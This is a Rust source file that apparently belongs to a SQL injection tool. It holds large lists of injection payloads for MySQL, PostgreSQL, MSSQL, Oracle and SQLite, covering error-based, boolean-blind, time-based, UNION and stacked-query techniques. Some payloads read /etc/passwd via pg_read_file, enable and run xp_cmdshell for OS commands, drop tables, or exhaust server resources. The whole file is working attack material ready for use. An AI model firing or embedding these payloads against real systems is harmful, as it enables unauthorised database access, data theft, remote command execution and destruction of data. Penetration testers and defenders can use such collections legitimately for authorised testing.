//! PayloadDatabase: comprehensive payload collections for all techniques.

pub struct PayloadDatabase;

impl PayloadDatabase {
    pub fn error_payloads() -> Vec<(&'static str, &'static str, &'static str)> {
        vec![
            ("'", "Single quote", "Generic"),
            ("\"", "Double quote", "Generic"),
            ("\\", "Backslash", "Generic"),
            ("' -- ", "Comment", "Generic"),
            ("' #", "Hash comment", "MySQL"),
            ("' /*", "Block comment", "Generic"),
            ("' AND 1=1", "AND condition", "Generic"),
            ("' AND 1=2", "AND false", "Generic"),
            ("' OR '1'='1", "OR true", "Generic"),
            ("' OR '1'='2", "OR false", "Generic"),
            ("' AND 1/0-- ", "Divide by zero", "MSSQL/Oracle"),
            ("' AND 1=CONVERT(int, 'a')-- ", "Conversion error", "MSSQL"),
            ("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- ", "EXTRACTVALUE", "MySQL 5.1+"),
            ("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)-- ", "UPDATEXML", "MySQL 5.1+"),
            ("' AND JSON_QUERY(1)-- ", "JSON error", "MSSQL 2016+"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- ", "Subquery error", "MySQL"),
            ("' AND EXP(~(SELECT * FROM (SELECT @@version)x))-- ", "EXP overflow", "MySQL"),
            ("' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT @@version)f)x))-- ", "GeometryCollection", "MySQL"),
            ("' AND MULTIPOINT((SELECT * FROM (SELECT @@version)x))-- ", "MultiPoint", "MySQL"),
            ("' AND POLYGON((SELECT * FROM (SELECT @@version)x))-- ", "Polygon error", "MySQL"),
            ("' AND LINESTRING((SELECT * FROM (SELECT @@version)x))-- ", "LineString error", "MySQL"),
            ("' AND MULTILINESTRING((SELECT * FROM (SELECT @@version)x))-- ", "MultiLineString", "MySQL"),
            ("' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT @@version)))-- ", "EXTRACTVALUE v2", "MySQL 5.1+"),
            ("' AND UPDATEXML(0x0a,CONCAT(0x0a,(SELECT @@version)),0x0a)-- ", "UPDATEXML v2", "MySQL 5.1+"),
            ("' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(@@version,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- ", "FLOOR RAND", "MySQL"),
            ("' AND 1=CAST(version() AS INTEGER)-- ", "pg cast error", "PostgreSQL"),
            ("' AND (SELECT CAST(current_setting('server_version') AS INTEGER))-- ", "pg cast setting", "PostgreSQL"),
            ("' AND pg_read_file('/etc/passwd')-- ", "pg_read_file", "PostgreSQL"),
            ("'; COPY (SELECT @@version) TO '/tmp/out'-- ", "COPY error", "PostgreSQL"),
            ("' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)-- ", "pg subquery cast", "PostgreSQL"),
            ("' AND '1'=CAST((SELECT current_database()) AS INTEGER)-- ", "pg db name cast", "PostgreSQL"),
            ("' AND 1=(SELECT TOP 1 name FROM sys.dm_exec_query_stats)-- ", "sys.dm_exec_query_stats", "MSSQL"),
            ("'; EXEC xp_cmdshell 'ver'-- ", "xp_cmdshell ver", "MSSQL"),
            ("'; EXEC xp_cmdshell 'whoami'-- ", "xp_cmdshell whoami", "MSSQL"),
            ("' AND 1=OPENROWSET('SQLOLEDB','';'sa';'','SELECT @@version')-- ", "OPENROWSET", "MSSQL"),
            ("' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sys.tables)-- ", "sys.tables cast", "MSSQL"),
            ("' AND 1=(SELECT TOP 1 CAST(@@version AS INT))-- ", "version cast", "MSSQL"),
            ("' HAVING 1=1-- ", "HAVING clause", "MSSQL"),
            ("' GROUP BY colname HAVING 1=1-- ", "GROUP BY HAVING", "MSSQL"),
            ("' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT user FROM DUAL))-- ", "CTXSYS.DRITHSX", "Oracle"),
            ("' AND 1=(SELECT DBMS_XPLAN.DISPLAY_CURSOR() FROM DUAL)-- ", "DBMS_XPLAN", "Oracle"),
            ("' AND 1=XMLTYPE((SELECT user FROM DUAL))-- ", "XMLType error", "Oracle"),
            ("' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- ", "UTL_INADDR", "Oracle"),
            ("' AND 1=ORDSYS.ORD_DICOM.getAttributeByName((SELECT user FROM DUAL),'x')-- ", "ORDSYS error", "Oracle"),
            ("' AND CASE WHEN (1=1) THEN 1/0 ELSE 1 END-- ", "CASE divide zero true", "Generic"),
            ("' AND CASE WHEN (1=2) THEN 1/0 ELSE 1 END-- ", "CASE divide zero false", "Generic"),
            ("' AND (SELECT 1 UNION SELECT 2)=1-- ", "Subquery multiple rows", "Generic"),
            ("' AND 1 IN (SELECT 1,2)-- ", "IN subquery columns", "Generic"),
            ("' AND 1=CONVERT(INT,(SELECT @@version))-- ", "CONVERT INT", "MSSQL"),
        ]
    }

    pub fn boolean_payloads() -> Vec<(&'static str, &'static str, bool)> {
        vec![
            (" AND 1=1", "Numeric TRUE", true), (" AND 2>1", "Numeric greater", true), (" AND 1<=1", "Numeric less equal", true),
            (" AND 1=2", "Numeric FALSE", false), (" AND 1>2", "Numeric greater false", false), (" AND 0=1", "Numeric zero false", false),
            ("' AND '1'='1", "String TRUE", true), ("' AND 'a'='a", "String char TRUE", true), ("' AND '1'<>'2", "String not equal TRUE", true),
            ("' AND '1'='2", "String FALSE", false), ("' AND 'a'='b", "String char FALSE", false), ("' AND 1=2-- ", "String comment FALSE", false),
            ("' AND 1=1#", "Hash TRUE", true), ("' AND 1=2#", "Hash FALSE", false), ("' AND 1=1-- ", "Dash TRUE", true), ("' AND 1=2-- ", "Dash FALSE", false),
            (" AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1", "CASE WHEN TRUE numeric", true),
            (" AND CASE WHEN (1=2) THEN 1 ELSE 0 END=1", "CASE WHEN FALSE numeric", false),
            ("' AND CASE WHEN ('a'='a') THEN '1' ELSE '2' END='1'-- ", "CASE WHEN string TRUE", true),
            ("' AND CASE WHEN ('a'='b') THEN '1' ELSE '2' END='1'-- ", "CASE WHEN string FALSE", false),
            (" AND CASE 1 WHEN 1 THEN 1 ELSE 0 END=1", "CASE simple TRUE", true),
            (" AND CASE 1 WHEN 2 THEN 1 ELSE 0 END=0", "CASE simple FALSE", false),
            (" AND 1&1=1", "Bitwise AND TRUE", true), (" AND 1&0=0", "Bitwise AND zero", true),
            (" AND 1^0=1", "Bitwise XOR TRUE", true), (" AND 1^1=0", "Bitwise XOR zero", true),
            (" AND 1|0=1", "Bitwise OR TRUE", true), (" AND ~0=-1", "Bitwise NOT TRUE", true),
            ("' AND SUBSTRING('abcdef',1,1)='a'-- ", "SUBSTRING TRUE", true),
            ("' AND SUBSTRING('abcdef',1,1)='z'-- ", "SUBSTRING FALSE", false),
            ("' AND ASCII(SUBSTRING('a',1,1))=97-- ", "ASCII char TRUE", true),
            ("' AND ASCII(SUBSTRING('a',1,1))=98-- ", "ASCII char FALSE", false),
            ("' AND LENGTH('abc')=3-- ", "LENGTH TRUE", true), ("' AND LENGTH('abc')=4-- ", "LENGTH FALSE", false),
            (" AND (SELECT 1)=1", "Subquery TRUE", true), (" AND (SELECT 0)=1", "Subquery FALSE", false),
            (" AND (SELECT COUNT(*)>0 FROM information_schema.tables)-- ", "IS info_schema accessible TRUE", true),
            ("' AND EXISTS(SELECT 1)-- ", "EXISTS TRUE", true), ("' AND NOT EXISTS(SELECT 1 WHERE 1=2)-- ", "NOT EXISTS TRUE", true),
            (" AND MID('abc',1,1)='a'", "MID TRUE MySQL", true), (" AND MID('abc',1,1)='z'", "MID FALSE MySQL", false),
            (" AND FIELD(1,1,2,3)=1", "FIELD TRUE MySQL", true), (" AND FIELD(9,1,2,3)=0", "FIELD FALSE MySQL", true),
            (" AND FIND_IN_SET(1,'1,2,3')>0", "FIND_IN_SET TRUE", true),
            (" AND IF(1=1,1,0)=1", "IF TRUE MySQL", true), (" AND IF(1=2,1,0)=0", "IF FALSE MySQL", true),
            ("' AND 'a'||'b'='ab'-- ", "Concat TRUE PG", true), ("' AND 'a'||'b'='ac'-- ", "Concat FALSE PG", false),
            ("' AND OVERLAY('abcdef' PLACING 'x' FROM 1 FOR 1)='xbcdef'-- ", "OVERLAY TRUE PG", true),
            (" AND 1=ANY(ARRAY[1,2,3])", "ANY array TRUE PG", true), (" AND 4=ANY(ARRAY[1,2,3])", "ANY array FALSE PG", false),
            ("' AND CHARINDEX('a','abc')>0-- ", "CHARINDEX TRUE MSSQL", true),
            ("' AND CHARINDEX('z','abc')>0-- ", "CHARINDEX FALSE MSSQL", false),
            ("' AND LEN('abc')=3-- ", "LEN TRUE MSSQL", true), ("' AND ISNULL(1,0)=1-- ", "ISNULL TRUE MSSQL", true),
            ("' AND PATINDEX('%a%','abc')>0-- ", "PATINDEX TRUE MSSQL", true),
        ]
    }

    pub fn time_payloads() -> Vec<(&'static str, &'static str, u64)> {
        vec![
            ("' AND SLEEP(3)-- ", "MySQL SLEEP", 3), ("' AND BENCHMARK(10000000,MD5(1))-- ", "MySQL BENCHMARK", 2),
            ("' AND IF(1=1, SLEEP(3), 0)-- ", "MySQL IF SLEEP", 3), ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- ", "MySQL Subquery", 3),
            ("' AND SLEEP(3)/*", "MySQL SLEEP no space", 3),
            ("' AND pg_sleep(3)-- ", "PostgreSQL pg_sleep", 3), ("' AND (SELECT 1 FROM pg_sleep(3))-- ", "PostgreSQL SELECT", 3),
            ("' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- ", "PostgreSQL CASE", 3),
            ("; WAITFOR DELAY '00:00:03'-- ", "MSSQL WAITFOR", 3), ("; WAITFOR TIME '00:00:03'-- ", "MSSQL WAITFOR TIME", 3),
            ("' AND 1=(SELECT 1 FROM (SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2) AS s3)-- ", "MSSQL Heavy", 2),
            ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- ", "Oracle DBMS_PIPE", 3),
            ("' AND (SELECT COUNT(*) FROM ALL_USERS t1, ALL_USERS t2, ALL_USERS t3) > 0-- ", "Oracle Heavy", 2),
            ("' AND randomblob(1000000000)-- ", "SQLite randomblob", 2), ("' AND substr(randomblob(1000000000),1,1)-- ", "SQLite substr", 2),
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a) AND '1'='1", "Generic SLEEP", 3),
            ("' AND (SELECT 1 FROM (SELECT SLEEP(3))t)-- ", "MySQL subquery SLEEP", 3),
            ("' AND IF(1=1,SLEEP(3),SLEEP(0))-- ", "MySQL IF SLEEP true", 3), ("' AND IF(1=2,SLEEP(3),SLEEP(0))-- ", "MySQL IF SLEEP false branch", 0),
            ("' AND IF(ISNULL(NULL),SLEEP(3),0)-- ", "MySQL IF ISNULL SLEEP", 3),
            ("' AND BENCHMARK(50000000,SHA1(1))-- ", "MySQL BENCHMARK SHA1", 3), ("' AND BENCHMARK(50000000,AES_ENCRYPT(1,2))-- ", "MySQL BENCHMARK AES", 3),
            ("'; SELECT SLEEP(3)-- ", "MySQL stacked SLEEP", 3),
            ("' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,SLEEP(3))),1)-- ", "MySQL PROCEDURE ANALYSE", 3),
            ("'; SELECT pg_sleep(3)-- ", "PostgreSQL stacked pg_sleep", 3), ("' AND 1=(SELECT 1 FROM pg_sleep(3))-- ", "PostgreSQL SELECT pg_sleep", 3),
            ("' OR 1=(SELECT 1 FROM pg_sleep(3))-- ", "PostgreSQL OR pg_sleep", 3),
            ("'; SELECT generate_series(1,1000000)-- ", "PostgreSQL generate_series", 2),
            ("' AND (SELECT COUNT(*) FROM generate_series(1,1000000))>0-- ", "PostgreSQL generate_series count", 2),
            ("' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- ", "PostgreSQL CASE pg_sleep", 3),
            ("'; DECLARE @v INT; SET @v=0; WAITFOR DELAY '00:00:03'-- ", "MSSQL WAITFOR variable", 3),
            ("'; IF 1=1 WAITFOR DELAY '00:00:03'-- ", "MSSQL IF WAITFOR", 3),
            ("'; IF 1=2 WAITFOR DELAY '00:00:00' ELSE WAITFOR DELAY '00:00:03'-- ", "MSSQL IF ELSE WAITFOR", 3),
            ("' AND 1=(SELECT 1 FROM (SELECT COUNT(*) FROM sysobjects AS s1 CROSS JOIN sysobjects AS s2 CROSS JOIN sysobjects AS s3)t)-- ", "MSSQL heavy CROSS JOIN", 3),
            ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(32)||CHR(32)||CHR(32),3)-- ", "Oracle DBMS_PIPE CHR", 3),
            ("' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM DUAL)-- ", "Oracle CASE divide zero", 2),
            ("' AND UTL_HTTP.REQUEST('http://127.0.0.1:1')='x'-- ", "Oracle UTL_HTTP timeout", 3),
            ("' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS t1, ALL_OBJECTS t2)-- ", "Oracle ALL_OBJECTS heavy", 3),
            ("' AND randomblob(2000000000)-- ", "SQLite randomblob large", 3),
            ("' AND (SELECT randomblob(500000000)||randomblob(500000000))-- ", "SQLite randomblob concat", 3),
            ("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- ", "SQLite LIKE randomblob", 2),
        ]
    }

    pub fn union_column_payloads() -> Vec<(String, String, usize)> {
        let mut payloads = Vec::new();
        for n in 1usize..=20 {
            let nulls: Vec<&str> = vec!["NULL"; n];
            let nums: Vec<String> = (1..=n).map(|i| i.to_string()).collect();
            let strs: Vec<String> = (1..=n).map(|i| format!("'{}'", (b'a' + (i as u8 - 1)) as char)).collect();
            payloads.push((format!("' UNION SELECT {}-- ", nulls.join(",")), format!("NULL-based {} cols", n), n));
            payloads.push((format!("' UNION ALL SELECT {}-- ", nulls.join(",")), format!("NULL UNION ALL {} cols", n), n));
            payloads.push((format!("-1' UNION SELECT {}-- ", nulls.join(",")), format!("Neg-ID NULL {} cols", n), n));
            payloads.push((format!("-999' UNION SELECT {}-- ", nulls.join(",")), format!("Neg-999 NULL {} cols", n), n));
            payloads.push((format!("0' UNION SELECT {}-- ", nulls.join(",")), format!("Zero-ID NULL {} cols", n), n));
            payloads.push((format!("' UNION SELECT {}-- ", nums.join(",")), format!("Number-based {} cols", n), n));
            payloads.push((format!("-1' UNION SELECT {}-- ", nums.join(",")), format!("Neg-ID number {} cols", n), n));
            payloads.push((format!("' UNION SELECT {}-- ", strs.join(",")), format!("String-based {} cols", n), n));
            let mixed: Vec<String> = (1..=n).map(|i| if i % 2 == 0 { "NULL".to_string() } else { i.to_string() }).collect();
            payloads.push((format!("' UNION SELECT {}-- ", mixed.join(",")), format!("Mixed NULL+num {} cols", n), n));
            payloads.push((format!("' UNION SELECT {}#", nulls.join(",")), format!("NULL hash-comment {} cols", n), n));
            payloads.push((format!("-1' UNION SELECT {}#", nums.join(",")), format!("Neg-ID number hash {} cols", n), n));
        }
        payloads
    }

    pub fn union_payloads(column_count: usize) -> Vec<String> {
        let mut payloads = Vec::new();
        for i in 1..=column_count {
            payloads.push(format!("' ORDER BY {}-- ", i));
            payloads.push(format!("' ORDER BY {}#", i));
        }
        let columns: Vec<String> = (1..=column_count).map(|n| n.to_string()).collect();
        payloads.push(format!("' UNION SELECT {}-- ", columns.join(",")));
        payloads.push(format!("' UNION ALL SELECT {}-- ", columns.join(",")));
        payloads.push(format!("' UNION SELECT {}#", columns.join(",")));
        let nulls: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
        payloads.push(format!("' UNION SELECT {}-- ", nulls.join(",")));
        payloads.push(format!("-1' UNION SELECT {}-- ", nulls.join(",")));
        payloads
    }

    pub fn stacked_payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("; DROP TABLE test-- ", "Generic DROP"),
            ("; CREATE TABLE test (id int)-- ", "Generic CREATE"),
            ("; INSERT INTO test VALUES (1)-- ", "Generic INSERT"),
            ("; EXEC xp_cmdshell 'dir'-- ", "MSSQL xp_cmdshell"),
            ("; EXEC sp_configure 'xp_cmdshell', 1-- ", "MSSQL enable xp_cmdshell"),
        ]
    }
}
